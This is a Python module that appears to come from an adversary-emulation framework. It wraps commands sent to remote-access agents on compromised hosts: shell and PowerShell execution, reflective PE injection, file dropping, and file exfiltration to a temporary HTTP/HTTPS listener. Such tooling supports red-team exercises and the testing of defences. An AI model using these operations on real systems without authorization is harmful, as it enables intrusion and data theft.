import functools
import http.server
import threading
import socketserver
import ssl
import logging
from typing import List, Callable

from .. import interface as interface_module
from .. import event_logging
from ..engine.objects import Operation, ObservedRat, ActiveConnection
from ..commands.command import CommandLine
from ..commands.powershell import PSFunction
from .operation_errors import MissingFileError

log = logging.getLogger(__name__)


# This class wraps all calls to the interface module and saves job objects to the operation object
class InterfaceWrapper(object):
    def __init__(self, operation: Operation):
        self.operation = operation
        self.callbacks = []

    def __getattr__(self, name):
        # purposely raises AttributeError
        attr = getattr(interface_module, name)
        return functools.partial(self._wrapper, attr)

    def _wrapper(self, func, *args, **kwargs):
        job = func(*args, **kwargs)
        self.operation.modify(push__jobs=job)
        for callback in self.callbacks:
            callback(job)
        return job

    def register_callback(self, callback):
        self.callbacks.append(callback)

    def unregister_callback(self, callback):
        self.callbacks.remove(callback)


class OperationWrapper(object):
    """Wraps an operation, instances of this class are passed in as the first argument to an operation step."""
    def __init__(self, operation, interface: InterfaceWrapper):
        self._server_operation = operation
        self.interface = interface
        self.adversary_artifactlist = operation.adversary_profile

    def filter_fqdns(self, fqdns: List[str]) -> List[str]:
        """Filters the given list of fqdns, removing those that are not part of this game

        Args:
            fqdns: The fqdns to be filtered

        Returns:
            the filtered list of fqdns
        """
        return self._server_operation.filter_fqdns(fqdns)

    async def execute_shell_command(self, rat: ObservedRat, cmd: CommandLine, parser: Callable[[str], str]):
        """Sends a generic shell command to the rat

        Args:
            rat: the targeted rat
            cmd: the commandline to run
            parser: a parser that will be used to parse the results of the command

        Returns:
            The result of the command after being evaluated by the parser
        """
        ivcommand = await self._rat_process_command(rat, self.interface.send_shell_command, cmd.command_line)
        if parser:
            return parser(ivcommand.outputs['stdout'])
        else:
            return None

    async def exfil_network_connection(self, rat: ObservedRat, addr: str, port: str, file_path: str, method: str,
                                       parser: Callable[[str], str]):
        # define our own server handler so that we can process different HTTP request types
        class ExfilServerHandler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                http.server.SimpleHTTPRequestHandler.do_GET(self)

            def do_POST(self):
                # this isn't implemented by default, so to catch POST exfil, we need to do something here
                self.send_response(200)
                self.end_headers()
                # http.server.SimpleHTTPRequestHandler.do_GET(self)
        # get things ready to stand up a temporary server if needed
        # handler = http.server.SimpleHTTPRequestHandler
        handler = ExfilServerHandler
        httpd = socketserver.TCPServer(("0.0.0.0", int(port)), handler)
        if method == "https":  # wrap the server in ssl if needed
            httpd.socket = ssl.wrap_socket(httpd.socket, certfile='./conf/cert.pem', server_side=True,
                                           keyfile='./conf/key.pem')
        # get the thread ready so it can run in the background while we do the rest of our stuff
        thread = threading.Thread(target=httpd.serve_forever)
        # now check if we actually need to stand up the configured server or not
        if addr == "x.x.x.x" or addr is None:
            host = (self._server_operation.rat_of_ob(rat)).host
            # TODO: must make sure "connections" > 0, can it be greater than 1?
            final_addr = (ActiveConnection.objects(host=host.id).first()).local_ip
            # stand up local server to handle this connection now
            thread.start()
        else:
            final_addr = addr
        # send the command to crater to process
        ivcommand = await self._rat_process_command(rat, self.interface.exfil_network_connection,
                                                    final_addr, port, file_path, method)
        if addr == "x.x.x.x" or addr is None:
            # if we had to stand up a connection, stop it
            httpd.shutdown()
            httpd.server_close()

        if parser:
            return parser(ivcommand.outputs['stdout'])
        else:
            return ivcommand.outputs['stdout']

    async def execute_powershell(self, rat: ObservedRat, mdl: str, fctn: PSFunction, parser: Callable[[str], str]=None):
        ivcommand = await self._rat_process_command(rat, self.interface.powershell_function, mdl, fctn)
        if parser:
            return parser(ivcommand.outputs['stdout'])
        else:
            return None

    async def reflectively_execute_exe(self, rat: ObservedRat, mdl: str, commandline: CommandLine,
                                       parser: Callable[[str], str]=None):
        ivcommand = await self._rat_process_command(rat, self.interface.invoke_reflective_pe_injection, mdl, commandline)
        if parser:
            return parser(ivcommand.outputs['stdout'])
        else:
            return None

    async def drop_file(self, rat: ObservedRat, file_path_dest: str, file_path_src: str):
        try:
            with open(file_path_src, "rb") as file:
                dump = file.read()

            ivcommand = await self._rat_process_command(rat, self.interface.drop_file, file_path_dest, dump)
            return True
        except FileNotFoundError as e:
            if file_path_src.endswith('ps.hex'):
                raise MissingFileError("ps.hex not found. Please download it from the settings tab.")
            else:
                raise MissingFileError(e)

    async def _rat_process_command(self, obrat: ObservedRat, interface_func, *args):
        rat = self._server_operation.rat_of_ob(obrat)
        event = event_logging.ProcessEvent(host=obrat.host.fqdn, ppid=obrat.pid, pid=None,
                                           command_line=None)
        job = interface_func(rat, *args)
        try:
            # Note: intentionally not catching JobException here
            await job.wait_till_completed()
            job.reload()
            ivcommand = job.rat_result()

            if 'command_line' in ivcommand.parameters:
                event.update(command_line=ivcommand.parameters['command_line'])
            if 'pid' in ivcommand.outputs:
                event.update(pid=int(ivcommand.outputs['pid']))
        finally:
            if event['pid']:
                event.end(job.status == 'success')
                self._server_operation.log_event(event)
            elif event['command_line']:
                log.debug('Oops commandline was reported without a pid')

        return ivcommand
